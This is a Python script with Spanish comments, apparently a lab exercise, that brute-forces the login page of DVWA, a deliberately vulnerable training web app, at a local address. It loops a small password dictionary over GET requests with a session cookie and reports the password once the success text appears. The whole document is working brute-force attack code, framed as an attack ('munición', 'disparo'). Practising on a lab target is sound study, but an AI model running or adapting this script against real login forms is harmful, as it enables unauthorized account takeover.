import requests

# 1. Configuración del Objetivo (Asegúrate de que esta URL sea la de tu DVWA local)
url = "http://10.0.2.4/dvwa/vulnerabilities/brute/"

# 2. Autenticación (¡Muy importante en Hacking Web!)
# Para atacar DVWA, tu script necesita fingir que ya iniciaste sesión.
# Debes poner aquí tu ID de sesión real (te explico cómo sacarlo más abajo).
mis_cookies = {
    "security": "low",
    "PHPSESSID": "3e66b62f8dc1bbbb669792872a59967a" 
}

# 3. Nuestras municiones
usuario = "admin"
# Puedes añadir más palabras a esta lista
diccionario = ["12345", "qwerty", "password", "admin", "11111", "password", "admin123", "gatitoBeauty"]

print("🔥 Iniciando ataque de Fuerza Bruta...\n")

# 4. El Bucle de Ataque
for clave in diccionario:
    print(f"[*] Probando clave: {clave}")
    
    # Preparamos los datos tal como DVWA los espera en la URL
    parametros = {
        "username": usuario,
        "password": clave,
        "Login": "Login"
    }
    
    # 5. El Disparo: Hacemos la petición GET a la página
    respuesta = requests.get(url, params=parametros, cookies=mis_cookies)
    
    # 6. Verificamos el resultado leyendo el HTML que nos devuelve la página
    # Si la clave es correcta, DVWA muestra este texto específico:
    if "Welcome to the password protected area" in respuesta.text:
        print(f"\n[+++] ¡BINGO! 🎯 La contraseña es: {clave}")
        break # ¡Rompemos el bucle porque ya ganamos!
    else:
        print("[-] Incorrecta.")